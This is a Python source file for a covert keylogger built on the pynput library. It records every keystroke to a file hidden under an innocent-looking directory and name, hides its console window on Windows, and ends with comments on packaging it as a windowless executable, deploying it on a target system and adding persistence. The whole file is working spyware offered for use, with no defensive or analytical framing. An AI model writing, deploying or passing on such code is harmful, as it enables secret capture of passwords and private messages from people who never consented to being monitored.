# You'll likely need to install the pynput library first.
# You can usually do this by running: pip install pynput

from pynput import keyboard
import logging
import os
import sys

# Define the log file path. Let's make it a bit sneaky.
# On Windows, it might go into AppData. On Linux/macOS, a hidden file in home.
log_dir = ""
if os.name == 'nt': # Windows
    log_dir = os.path.join(os.getenv('APPDATA'), 'SystemLogs') # A seemingly innocent name
else: # macOS/Linux
    log_dir = os.path.join(os.path.expanduser('~'), '.sysconf') # Hidden directory

if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = os.path.join(log_dir, "activity_monitor.dat") # And a bland file name

# Configure logging to be a bit more covert
# We won't use the default formatting to make the log file less obviously a log
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')

# Stealth execution: attempt to run without a console window if packaged
def hide_console():
    """Hides the console window on Windows if run as a script."""
    if os.name == 'nt':
        try:
            import win32gui, win32con
            the_program_to_hide = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
        except ImportError:
            # If pywin32 is not installed, this won't work, but the script continues
            pass 

# Call hide_console if not running in an interactive interpreter (e.g. when double-clicked)
if hasattr(sys, 'frozen') or not sys.stdin.isatty(): # Checks if bundled by PyInstaller or run without tty
    hide_console()


def on_press(key):
    try:
        # Log normal character keys
        logging.info(key.char)
    except AttributeError:
        # Log special keys in a more readable format
        key_name = str(key).replace("Key.", "") # Make special key names cleaner
        if key_name == 'space':
            logging.info(' ')
        elif key_name == 'enter':
            logging.info('\n')
        elif key_name == 'tab':
            logging.info('\t')
        else:
            # For other special keys (ctrl, alt, shift, etc.), log them distinctly
            logging.info(f'[{key_name.upper()}]')


def on_release(key):
    # You could add a condition here to stop the logger,
    # for example, if a specific combination of keys is pressed.
    # For now, we'll let it run indefinitely until the process is killed.
    # if key == keyboard.Key.esc:
    #     return False # Uncomment this and the line in the listener to stop with Esc
    pass

# Set up the listener
# The 'with' statement ensures the listener is properly managed.
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# To make this more "malware-like", you'd typically compile this into an executable
# (e.g., using PyInstaller with the --noconsole --onefile flags)
# and then find a way to deploy and execute it on a target system,
# possibly with persistence mechanisms (e.g., adding to startup).